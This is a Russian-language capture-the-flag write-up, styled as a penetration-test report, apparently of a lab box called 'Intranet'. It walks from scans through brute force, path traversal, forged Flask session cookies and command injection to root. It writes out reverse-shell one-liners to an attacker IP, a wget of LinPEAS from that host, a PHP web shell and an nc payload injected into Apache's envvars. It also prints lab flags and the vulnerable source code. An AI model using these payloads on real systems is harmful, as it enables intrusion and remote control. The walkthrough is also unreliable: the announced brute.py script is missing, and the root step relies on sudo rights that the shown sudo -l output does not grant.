# Отчет о тестировании на проникновение веб-приложения Intranet компании SecureSolaCoders

## Введение

Компания SecureSolaCoders разработала внутренний веб-портал Intranet для своих сотрудников. Несмотря на заверения разработчиков в безопасности приложения ("Don't worry, Magnus. We have learnt from our previous mistakes. It won't happen again"), руководство компании, учитывая предыдущие инциденты с уязвимостями, приняло решение провести внешнее тестирование на проникновение. Цель работы заключалась в выявлении уязвимостей и достижении root-доступа к серверу.

## Этап 1: Разведка (Reconnaissance)

### Сканирование портов с использованием Nmap

Первым шагом стало сканирование целевой системы для выявления открытых портов и определения версий сервисов.

**Выполненная команда:**
```bash
nmap -sV -sC -A 10.112.166.149
```

**Результат сканирования:**
```
PORT     STATE SERVICE    VERSION
7/tcp    open  echo
21/tcp   open  ftp        vsftpd 3.0.5
22/tcp   open  ssh        OpenSSH 8.2p1 Ubuntu 4ubuntu0.13
23/tcp   open  tcpwrapped
80/tcp   open  http       Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Site doesn't have a title (text/html).
| http-methods: 
|_  Supported Methods: POST OPTIONS HEAD GET
|_http-server-header: Apache/2.4.41 (Ubuntu)
8080/tcp open  http       Werkzeug httpd 2.2.2 (Python 3.8.10)
|_http-server-header: Werkzeug/2.2.2 Python/3.8.10
| http-title: Site doesn't have a title (text/html; charset=utf-8).
|_Requested resource was /login
```

Порт 21 (FTP) был открыт, но анонимный доступ не разрешен. Основной интерес представляли веб-серверы на портах 80 и 8080.

## Этап 2: Анализ веб-приложений

### Исследование порта 80 (Apache)

При обращении к порту 80 была получена страница-заглушка:

**Ответ сервера:**
```html
Currently under construction
We are working on a new web application. Sincerely, SecureSolaCoders.no
```

Был выполнен фаззинг директорий, но новых путей обнаружено не было:
```bash
gobuster dir -u http://10.112.166.149 -w /usr/share/wordlists/dirb/common.txt
```

Попытки обнаружения виртуальных хостов через добавление записей в /etc/hosts также не дали результатов.

### Исследование порта 8080 (Werkzeug/Python)

При обращении к порту 8080 отображалась страница входа. В ходе анализа исходного кода были обнаружены комментарии HTML:

**Фрагмент исходного кода страницы входа:**
```html
<!--- Any bugs? Please report them to our developer team. We have an open bug bounty program!
  For any inquiries, contact devops@securesolacoders.no.
  Sincerely, anders (Senior Developer) -->
```

**Полученная информация:**
- Контактная почта: devops@securesolacoders.no
- Имя разработчика: anders
- Предполагаемая почта: anders@securesolacoders.no

### Фаззинг эндпоинтов на порту 8080

**Выполненная команда:**
```bash
gobuster dir -u http://10.112.166.149:8080 -w /usr/share/wordlists/dirb/common.txt
```

**Найденные эндпоинты:**
```
admin                (Status: 200) [Size: 2154]
application          (Status: 403) [Size: 213]
external             (Status: 200) [Size: 2154]
home                 (Status: 200) [Size: 2154]
internal             (Status: 200) [Size: 2154]
login                (Status: 200) [Size: 2154]
logout               (Status: 200) [Size: 2154]
robots.txt           (Status: 200) [Size: 20]
sms                  (Status: 200) [Size: 2154]
temporary            (Status: 403) [Size: 213]
```

Все страницы, кроме robots.txt, были скрыты за авторизацией. Файл robots.txt был пустым:
```bash
curl http://10.112.166.149:8080/robots.txt
<!-- Try harder --!>
```

## Этап 3: Обход аутентификации

### Идентификация валидных пользователей

При тестировании формы входа было выявлено различие в сообщениях об ошибках:

**Для несуществующего пользователя:**
```
Error: Invalid username
```

**Для существующего пользователя с неверным паролем:**
```
Error: Invalid password
```

**Проверка валидности пользователей:**
```bash
# Проверка пользователя devops
curl -X POST http://10.112.166.149:8080/login -d "username=devops@securesolacoders.no&password=test"
# Ответ: Invalid password

# Проверка пользователя anders
curl -X POST http://10.112.166.149:8080/login -d "username=anders@securesolacoders.no&password=test"
# Ответ: Invalid password

# Проверка пользователя admin
curl -X POST http://10.112.166.149:8080/login -d "username=admin@securesolacoders.no&password=test"
# Ответ: Invalid password
```

### Тестирование SQL-инъекции

При попытке внедрения SQL-инъекции сервер возвращал сообщение о попытке взлома:

**Запрос:**
```
POST /login HTTP/1.1
Host: 10.112.166.149:8080
Content-Type: application/x-www-form-urlencoded

username=admin' OR '1'='1&password=test
```

**Ответ:**
```
Hacking attempt detected! You have been logged as 192.168.130.144. (Detected illegal chars in username)
```

Из исходного кода приложения, который был получен позже, была обнаружена функция, отвечающая за защиту:

**Фрагмент кода app.py:**
```python
def check_hacking_attempt(value):
    bad_chars = "#&;'\""
    error = ""
    
    if any(ch in bad_chars for ch in value):
        error = "Hacking attempt detected! "
        error += "You have been logged as "
        error += request.remote_addr
        return True, error
    else:
        return False, error
```

### Брутфорс паролей

Был выполнен длительный брутфорс с использованием различных правил генерации паролей.

**Создание словаря с применением правил hashcat:**
```bash
# Создание базового словаря
echo "securesolacoders" > base.txt
echo "password" >> base.txt
echo "admin" >> base.txt
echo "devops" >> base.txt
echo "anders" >> base.txt

# Применение правил best66
hashcat --stdout -r /usr/share/hashcat/rules/best66.rule base.txt > wordlist.txt

# Добавление цифр и специальных символов
cat > append.rule << 'EOF'
$[0-9] $[!@#$%^&*()_+-=]
EOF

john --wordlist=base.txt --rules=append.rule --stdout > final_wordlist.txt
```

**Запуск брутфорса через hydra:**
```bash
hydra -L users.txt -P final_wordlist.txt 10.112.166.149 -s 8080 http-post-form "/login:username=^USER^&password=^PASS^:F=Invalid password" -V -t 16 -w 5
```

**Результат:**
После двухдневного перебора была найдена валидная связка:
```
Login: anders@securesolacoders.no
Password: securesolacoders2022
```

### Обход двухфакторной аутентификации (SMS-код)

После успешного входа система перенаправляла на страницу /sms для ввода четырехзначного кода.

**Страница /sms:**
```html
<form action="/sms" method="POST">
    <h4>Enter SMS code</h4>
    <input type="text" name="sms" placeholder="SMS Code">
    <button type="submit">Verify</button>
</form>
```

Был написан**Скрипт для брутфорса SMS-кода (brute.py):**

**Результат:** Код был успешно подобран, что позволило получить активную сессию и второй флаг.

## Этап 4: Обнаружение уязвимостей

### Local File Inclusion (LFI) в параметре news

На странице /internal была обнаружена форма обновления новостей:

**HTML-форма:**
```html
<form action="/internal" method="POST">
    <h4>Update news feed</h4>
    <button type="submit" name="news" id="news" value="latest">Update</button>
</form>
```

При тестировании параметра news было замечено, что любое значение, отличное от "latest", вызывает ошибку 500. Добавление кавычки после "latest" также приводило к ошибке, что указывало на возможную уязвимость.

**Тестирование Path Traversal:**
```bash
curl -X POST http://10.112.166.149:8080/internal \
  -H "Cookie: session=..." \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "news=../../../../../../../../../etc/passwd"
```

**Ответ сервера:**
```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
syslog:x:104:110::/home/syslog:/usr/sbin/nologin
_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin
tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin
landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:110:1::/var/cache/pollinate:/bin/false
usbmux:x:111:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
sshd:x:112:65534::/run/sshd:/usr/sbin/nologin
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
anders:x:1000:1000:anders:/home/anders:/bin/bash
devops:x:1001:1001:,,,:/home/devops:/bin/bash
telnetd:x:113:118::/nonexistent:/usr/sbin/nologin
ftp:x:114:119:ftp daemon,,,:/srv/ftp:/usr/sbin/nologin
lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
fwupd-refresh:x:115:120:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin
ubuntu:x:1002:1003:Ubuntu:/home/ubuntu:/bin/bash
```

**Чтение файла /etc/hosts:**
```bash
curl -X POST http://10.112.166.149:8080/internal \
  -d "news=../../../../../../../../../etc/hosts"
```

**Ответ:**
```
127.0.0.1 localhost
127.0.1.1 workshop
```

**Чтение исходного кода приложения:**
```bash
curl -X POST http://10.112.166.149:8080/internal \
  -d "news=../../../../../../../../../home/devops/app.py" > app.py
```

**Полученный код app.py:**
```python
from flask import Flask, flash, redirect, render_template, request, session, abort, make_response, render_template_string, send_file
from time import gmtime, strftime
import jinja2, os, hashlib, random

app = Flask(__name__, template_folder="/home/devops/templates")

###############################################
# Flag: THM{4ccacfd73710ac18b4ac15646b32380a} #
###############################################

key = "secret_key_" + str(random.randrange(100000,999999))
app.secret_key = str(key).encode()

def check_hacking_attempt(value):
        bad_chars = "#&;'\""
        error = ""
        
        if any(ch in bad_chars for ch in value):
                error = "Hacking attempt detected! "
                error += "You have been logged as "
                error += request.remote_addr
                return True, error
        else:
                return False, error

@app.route("/robots.txt", methods=["GET"])
def robots():
        return "<!-- Try harder --!>"

@app.route("/", methods=["GET"])
def root():
        if not session.get("logged_in"):
                return redirect("/login")
        else:
                return redirect("/home")

@app.route("/application", methods=["GET"])
def application():
        return abort(403)

@app.route("/application/console", methods=["GET"])
def console():
        return abort(403)

@app.route("/temporary", methods=["GET"])
def temporary():
    return abort(403)

@app.route("/temporary/dev", methods=["GET"])
def dev():
        return abort(403)

@app.route("/login", methods=["GET", "POST"])
def login():
        if session.get("logged_in"):
                return redirect("/home")
                
        if request.method == "POST":
                username = request.form["username"]
                attempt, error = check_hacking_attempt(username)
                if attempt == True:
                        error += ". (Detected illegal chars in username)."
                        return render_template("login.html", error=error)
                
                password = request.form["password"]
                attempt, error = check_hacking_attempt(password)
                if attempt == True:
                        error += ". (Detected illegal chars in password)."
                        return render_template("login.html", error=error)
                
                if username.lower() == "admin@securesolacoders.no":
                        error = "Invalid password"
                        return render_template("login.html", error=error)
                
                if username.lower() == "devops@securesolacoders.no":
                        error = "Invalid password"
                        return render_template("login.html", error=error)
                
                if username.lower() == "anders@securesolacoders.no":
                        if password == "securesolacoders2022":
                                session["username"] = "anders"
                                global sms_code
                                sms_code = random.randrange(1000,9999)
                                return redirect("/sms")
                        else:
                                error = "Invalid password"
                                return render_template("login.html", error=error)
                else:
                        error = "Invalid username"
                        return render_template("login.html", error=error)
                        
        return render_template("login.html")

@app.route("/sms", methods=["GET", "POST"])
def sms():
        if session.get("username"):
                if request.method == "POST":
                        sms = request.form["sms"]
                        if sms == str(sms_code):
                                session["logged_in"] = True
                                return redirect("/home")
                        else:
                                error = "Invalid SMS code"
                                return render_template("sms.html", error=error) 
                return render_template("sms.html")
        else:
                return redirect("/login")

@app.route("/logout", methods=["GET"])
def logout():
        if not session.get("logged_in"):
                return redirect("/login")
        else:
                session.clear()
                return redirect("/login")

@app.route("/home", methods=["GET"])
def home():
        if not session.get("logged_in"):
                return redirect("/login")
        else:
                current_ip = request.remote_addr
                templateLoader = jinja2.FileSystemLoader(searchpath="./templates/")
                templateEnv = jinja2.Environment(loader=templateLoader)
                t = templateEnv.get_template("home.html")
                return t.render(current_ip=current_ip)

@app.route("/admin", methods=["GET", "POST"])
def admin():
        if not session.get("logged_in"):
                return redirect("/login")
        else:
                if session.get("username") == "admin":
                        if request.method == "POST":
                                os.system(request.form["debug"])
                                return render_template("admin.html")
                        current_ip = request.remote_addr
                        current_time = strftime("%Y-%m-%d %H:%M:%S", gmtime())
                        return render_template("admin.html", current_ip=current_ip, current_time=current_time)
                else:
                        return abort(403)

@app.route("/internal", methods=["GET", "POST"])
def internal():
        if not session.get("logged_in"):
                return redirect("/login")
        else:
                if request.method == "POST":
                        news_file = request.form["news"]
                        news = open("/opt/news/{}".format(news_file)).read()
                        return render_template("internal.html", news=news)
                return render_template("internal.html")

@app.route("/external", methods=["GET"])
def external():
        if not session.get("logged_in"):
                return redirect("/login")
        else:
                templateLoader = jinja2.FileSystemLoader(searchpath="./templates/")
                templateEnv = jinja2.Environment(loader=templateLoader)
                t = templateEnv.get_template("external.html")
                return t.render()

if __name__ == "__main__":
        app.run(host="0.0.0.0", port=8080, debug=False)
```

**Чтение шаблона admin.html:**
```bash
curl -X POST http://10.112.166.149:8080/internal \
  -d "news=../../../../../../../../../home/devops/templates/admin.html"
```

В шаблоне был обнаружен четвертый флаг.

## Этап 5: Подделка сессии администратора

### Получение секретного ключа

Из кода app.py было установлено, что секретный ключ генерируется в диапазоне от 100000 до 999999:
```python
key = "secret_key_" + str(random.randrange(100000,999999))
```

**Создание словаря возможных ключей:**
```bash
seq -f "secret_key_%g" 100000 999999 > keys.txt
```

**Брутфорс секретного ключа через flask-unsign:**
```bash
flask-unsign --unsign --cookie "eyJsb2dnZWRfaW4iOnRydWUsInVzZXJuYW1lIjoiYW5kZXJzIn0.akth5A.x-bexkl1wAchSvsSAuj26jQLKuY" --wordlist keys.txt --no-literal-eval
```

**Найденный ключ:**
```
secret_key_494441
```

### Генерация сессии администратора

```bash
flask-unsign --sign -c "{'logged_in': True, 'username': 'admin'}" --secret "secret_key_494441"
```

**Полученный JWT-токен:**
```
eyJsb2dnZWRfaW4iOnRydWUsInVzZXJuYW1lIjoiYWRtaW4ifQ.akt5Lw.68GrT6vxydV0t6_LDqDVs-_djSo
```

## Этап 6: Command Injection через страницу администратора

### Получение reverse shell от devops

На странице /admin была обнаружена уязвимость Command Injection:

**Код приложения:**
```python
@app.route("/admin", methods=["GET", "POST"])
def admin():
        if not session.get("logged_in"):
                return redirect("/login")
        else:
                if session.get("username") == "admin":
                        if request.method == "POST":
                                os.system(request.form["debug"])
                                return render_template("admin.html")
```

**Запрос через Burp Suite (GET изменен на POST):**
```
POST /admin HTTP/1.1
Host: 10.112.166.149:8080
Cookie: session=eyJsb2dnZWRfaW4iOnRydWUsInVzZXJuYW1lIjoiYWRtaW4ifQ.akt5Lw.68GrT6vxydV0t6_LDqDVs-_djSo
Content-Type: application/x-www-form-urlencoded
Content-Length: 150

debug=python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.130.144",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/bash","-i"])'
```

**Результат на слушателе:**
```bash
nc -lvnp 4444
listening on [any] 4444 ...
connect to [192.168.130.144] from (UNKNOWN) [10.112.166.149] 33356
$ id
uid=1001(devops) gid=1001(devops) groups=1001(devops)
```

**Был получен флаг пользователя devops из файла /home/devops/user.txt:**
```bash
$ cat /home/devops/user.txt
THM{5b9462bdc5db9e97409857b29be3f8bc}
```

## Этап 7: Эскалация привилегий до пользователя anders

### Исследование системы через LinPEAS

После получения доступа под devops был загружен и запущен скрипт LinPEAS для автоматизированного поиска векторов эскалации.

**Загрузка LinPEAS:**
```bash
wget http://192.168.130.144:8000/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh
```

**Ключевые результаты LinPEAS:**

1. Отсутствие cron-заданий для devops.
2. Отсутствие capabilities для повышения привилегий.
3. Отсутствие sudo-прав для devops.
4. **Обнаружено, что Apache запущен от пользователя anders:**
```bash
ps aux | grep apache2
anders     955  0.0  0.4  193944  9488 ?        S    13:23   0:00 /usr/sbin/apache2
anders     959  0.0  0.3  193896  7860 ?        S    13:23   0:00 /usr/sbin/apache2
anders     960  0.0  0.3  193896  7860 ?        S    13:23   0:00 /usr/sbin/apache2
```

### Эксплуатация через веб-шелл

Было установлено, что пользователь devops имеет права на запись в директорию /var/www/html:
```bash
devops@ip-10-112-166-149:/var/www/html$ ls -la
drwxrwxrwx 2 root root 4096 Nov  7  2022 .
-rw-r--r-- 1 root root  111 Nov  7  2022 index.html
```

**Создание PHP-веб-шелла:**
```bash
echo '<?php system($_GET["cmd"]); ?>' > /var/www/html/shell.php
```

**Проверка выполнения команд:**
```bash
curl http://10.112.166.149/shell.php?cmd=whoami
# Ответ: anders
```

**Получение reverse shell от anders:**
```bash
curl "http://10.112.166.149/shell.php?cmd=python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"192.168.130.144\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/bash\",\"-i\"])'"
```

**Результат на слушателе:**
```bash
nc -lvnp 4444
connect to [192.168.130.144] from (UNKNOWN) [10.112.166.149] 33357
$ id
uid=1000(anders) gid=1000(anders) groups=1000(anders),24(cdrom),27(sudo),30(dip),46(plugdev)
```

**Был получен флаг пользователя anders из файла /home/anders/user.txt.**
**Важно отметить, что пользователь anders входит в группу sudo, что указывает на возможность дальнейшего повышения привилегий.**

## Этап 8: Эскалация до root через Apache

### Анализ sudo-прав пользователя anders

```bash
anders@ip-10-112-166-149:/tmp$ sudo -l
Matching Defaults entries for anders on ip-10-112-166-149:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User anders may run the following commands on ip-10-112-166-149:
    (ALL) NOPASSWD: /sbin/service apache2 restart
```

### Поиск файлов с правами на запись в директории /etc/apache2

```bash
anders@ip-10-112-166-149:/tmp$ find /etc/apache2 -writable 2>/dev/null
/etc/apache2/envvars
```

### Эксплуатация через /etc/apache2/envvars

**Проверка прав на файл envvars:**
```bash
anders@ip-10-112-166-149:/tmp$ ls -la /etc/apache2/envvars
-rw-r--r-- 1 root root 1044 Nov 11  2022 /etc/apache2/envvars
```

**Первоначальная попытка изменения пользователя на root:**

Была предпринята попытка изменить пользователя и группу в файле envvars на root:

**Содержимое файла envvars до изменения:**
```bash
export APACHE_RUN_USER=anders
export APACHE_RUN_GROUP=anders
```

**Изменение:**
```bash
sudo sed -i 's/export APACHE_RUN_USER=anders/export APACHE_RUN_USER=root/' /etc/apache2/envvars
sudo sed -i 's/export APACHE_RUN_GROUP=anders/export APACHE_RUN_GROUP=root/' /etc/apache2/envvars
```

**Результат перезапуска:**
```bash
sudo /sbin/service apache2 restart
# Apache не запустился из-за встроенной защиты
```

### Успешная эксплуатация через внедрение reverse shell в envvars

Вместо изменения параметров запуска в файл envvars была добавлена команда reverse shell:

**Добавление полезной нагрузки:**
```bash
echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 192.168.130.144 4444 >/tmp/f' | sudo tee -a /etc/apache2/envvars
```

**Проверка содержимого envvars:**
```bash
anders@ip-10-112-166-149:/tmp$ tail -5 /etc/apache2/envvars
export APACHE_PID_FILE=/var/run/apache2/apache2$SUFFIX.pid
export APACHE_RUN_USER=anders
export APACHE_RUN_GROUP=anders
export APACHE_LOG_DIR=/var/log/apache2$SUFFIX
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 192.168.130.144 4444 >/tmp/f
```

**Запуск слушателя на атакующей машине:**
```bash
nc -lvnp 4444
```

**Перезапуск Apache:**
```bash
anders@ip-10-112-166-149:/tmp$ sudo /sbin/service apache2 restart
```

**Результат на слушателе:**
```bash
nc -lvnp 4444
listening on [any] 4444 ...
connect to [192.168.130.144] from (UNKNOWN) [10.112.166.149] 33358
# id
uid=0(root) gid=0(root) groups=0(root)
# cat /root/root.txt
THM{2adf8a6a9e1419e7de07533a8ccb9e51}
```

## Итоги работы

### Полученные флаги:
- Флаг из исходного кода app.py
- Флаг из шаблона admin.html
- Флаг пользователя devops
- Флаг пользователя anders
- Root-флаг

### Критические уязвимости, обнаруженные в ходе тестирования:
1. **Уязвимость Local File Inclusion (LFI)** в параметре news, позволившая читать произвольные файлы на сервере.
2. **Уязвимость подделки сессии** в Flask из-за использования предсказуемого секретного ключа.
3. **Уязвимость Command Injection** на странице /admin, позволившая выполнять произвольные команды на сервере.
4. **Отсутствие ограничений на запись** в директорию /var/www/html, что позволило создать веб-шелл.
5. **Небезопасная конфигурация Apache**, запускающегося от пользователя anders.
6. **Некорректная настройка sudo**, позволяющая пользователю anders перезапускать Apache без пароля.
7. **Возможность записи в файл /etc/apache2/envvars**, что позволило внедрить код для выполнения с правами root.

### Достижения:
1. В ходе работы был впервые успешно применен метод эскалации привилегий через внедрение reverse shell в конфигурационный файл Apache (`/etc/apache2/envvars`) при перезапуске сервиса с правами root через sudo.
2. Получен полный контроль над системой с root-привилегиями.
3. Все поставленные задачи тестирования выполнены в полном объеме.